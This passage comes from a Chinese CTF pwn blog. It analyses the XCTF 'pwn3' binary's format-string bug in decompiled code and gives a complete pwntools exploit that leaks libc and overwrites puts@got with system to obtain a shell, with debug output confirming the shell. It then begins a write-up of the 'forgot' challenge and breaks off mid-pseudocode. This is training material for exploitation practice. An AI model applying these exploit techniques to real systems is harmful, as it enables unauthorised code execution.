punctuation">)</span>v0<span class="token punctuation">;</span>     #最后堆区的地址给到了file_head Bss段全局变量  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>get_input函数    将堆区的地址v0传入即a1<span class="token comment" spellcheck="true">// a1是地址  a2是大小  a3是1</span><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  _BYTE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>           result <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #往a1里面读入字符，一次读一个whle循环    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> a3 <span class="token punctuation">)</span>   <span class="token operator">*</span>v4应该不会等于<span class="token number">10</span>，所以我觉都这个<span class="token keyword">if</span>语句完全不会执行，直接执行<span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        result <span class="token operator">=</span> v5 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      result <span class="token operator">=</span> <span class="token operator">++</span>v5<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>     #控制输入量不会大于a2        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>所以get_input大致作用是：标准输入中读入字符串，写入堆区v0。第一个get_input最多40个字节（字符），第二个从堆区(v0 + 10)开始因为v0是大小为4字节的指针，所以加10将</strong><br><strong>刚好从40个字节后开始填入字符串，最多读入200个：</strong><br><img src="https://s1.ax1x.com/2020/07/17/U6yP8x.png" alt=""></p><p><strong>show_dir函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-414h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+414h] [ebp-14h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+418h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+41Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1024u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// 将s数组置零</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">240</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    #首先i被赋值file_head即堆区地址，发现中间i并没有判断，后面的i再次进行赋值  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    #中间也没有明显的进行判断    <span class="token punctuation">{</span>      v0 <span class="token operator">=</span> v5<span class="token operator">++</span><span class="token punctuation">;</span>      s<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    #对s数组逐个赋值，从堆区地址开始    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>第一个for循环：i先被赋予堆区地址，中间的表达式（即i）不为0，执行一次内部语句后，i又被堆区240个字节开始赋值，靠后的应该这个区域值为0，所以第一个for应该只会执行一次<br>第二个for循环：中间是直接对(i + j)地址解引用，即(i + j)地址上的字节，显然解引用到值为0的地址才会停。<br>最后是调用puts函数其参数就是经过赋值后的s。<br><img src="https://s1.ax1x.com/2020/07/17/U6yCP1.png" alt=""><br>那么如果我file_name很短，那就只会将fiel_name赋给s数组，然后输出s（什么名字40个字符这么长？？）。那么基本就可以确定puts的参数就是s即file_name</p></blockquote><p><strong>get_file函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-FCh]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+E4h] [ebp-34h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10Ch] [ebp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter the file name you want to get:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%40s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   #显然这里不会存在溢出  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too young, too simple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #第一个是i被赋予堆区地址，第二个i显然不会为<span class="token number">0</span>，第三个将i转换为<span class="token number">4</span>字节指针后加<span class="token number">60</span>那其实                                                                        又是堆区<span class="token number">240</span>字节后的区域，将使i<span class="token operator">=</span> <span class="token number">0</span> ，所以这个<span class="token keyword">for</span>也只执行一次  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">// 堆区开头是file_name 所以输入对应的file_name到s1即可进入if</span>    <span class="token punctuation">{</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// i+40地址处的是我们的content </span>      <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>所以整个函数是你输入对应的file_name就输出对应的tontent（结合程序本身，伪码有些不一定准确），显然这个printf是存在格式化字符串漏洞的，但是它的参数是i+40即tontent的内容。</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>首先可以用这个漏洞泄露函数真实地址，从而得到libc版本。又ASLR没开，能漏洞改写函数got表上的地址，改成system地址。因为我们不能控制程序流程，只能靠跳转实现system（无法在栈上构造数据）。system函数只有一个参数，纵观程序中所有函数只有puts函数如此相像，我们想办法把puts的got表上的地址改为system地址，然后它的参数s内容搞成/bin/sh字符串即可。</strong></p><blockquote><p>确定格式化字符串参数偏移<br>利用 __libc_start_main_got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。<br>参数s就是我们的file_name<br>修改 puts@got 的内容为 system 的地址。<br>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</p></blockquote><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>注意printf漏洞是在get_file函数中实现的，所以一定要记得调用get选项</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span> context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn3'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_start_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'rxraclhm'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#密码绕过</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token string">'/sh'</span>      <span class="token comment" spellcheck="true">#名字/sh</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#准备__libc_start_main地址的泄露</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/sh'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print u32(sh.recv(4))</span>main_start_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到地址</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>main_start_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到libc版本</span>libc_addr <span class="token operator">=</span> main_start_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#名字/bin</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#准备将system地址写入puts_got</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用dir函数，此时s是/bin/sh 可通过调试得出</span><span class="token comment" spellcheck="true">#sh.recv()            最后将跳转puts函数参数为/bin/sh但执行system函数，得到shell</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-c"><code class="language-c">    000000d0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">00</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │·   │    │    │    <span class="token number">000000e0</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │    │    │    │    000000f0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">00</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">28</span> a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">29</span> a0  │    │  ·a│<span class="token function">aa</span><span class="token punctuation">(</span>·│··<span class="token punctuation">)</span>·│    <span class="token number">00000100</span>  <span class="token number">04</span> <span class="token number">08</span> 2a a0  <span class="token number">04</span> <span class="token number">08</span> 2b a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">66</span> <span class="token number">74</span>  <span class="token number">70</span> 3e        │··<span class="token operator">*</span>·│··<span class="token operator">+</span>·│··ft│p<span class="token operator">></span>│    0000010e               \x98            \x04                                                                                                                                                                                      \x00                                \<span class="token function">x00aa</span><span class="token punctuation">(</span>\xa0\x04<span class="token punctuation">)</span>\xa0\x04<span class="token operator">*</span>\xa0\x04<span class="token operator">+</span>\xa0\x04ftp<span class="token operator">></span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x4</span> bytes<span class="token punctuation">:</span>    <span class="token string">'dir\n'</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challege-forgot</title>
      <link href="/2020/07/16/xctf-challege-forgot/"/>
      <url>/2020/07/16/xctf-challege-forgot/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/forgot'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只开了NX</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数关键代码size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-74h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-54h]  #显然这是一串指针数组，指向函数</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun2<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-50h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-4Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v6<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-48h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v7<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-44h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-40h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v9<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-3Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-38h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-34h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-30h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+78h] [ebp-Ch]</span>  size_t i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-8h]</span>  v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  fun1 <span class="token operator">=</span> sub_8048604<span class="token punctuation">;</span>  #将函数地址赋值给指针  fun2 <span class="token operator">=</span> sub_8048618<span class="token punctuation">;</span>  fun3 <span class="token operator">=</span> sub_804862C<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> sub_8048640<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> sub_8048654<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> sub_8048668<span class="token punctuation">;</span>  v9 <span class="token operator">=</span> sub_804867C<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> sub_8048690<span class="token punctuation">;</span>  v11 <span class="token operator">=</span> sub_80486A4<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> sub_80486B8<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>   #溢出点函数，没有限制输入的大小   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v14 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048702</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #里面的函数是来对单个字符进行判别的，比较复杂，但是能搞懂逻辑顺序。          v14 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_804874C</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                v14 <span 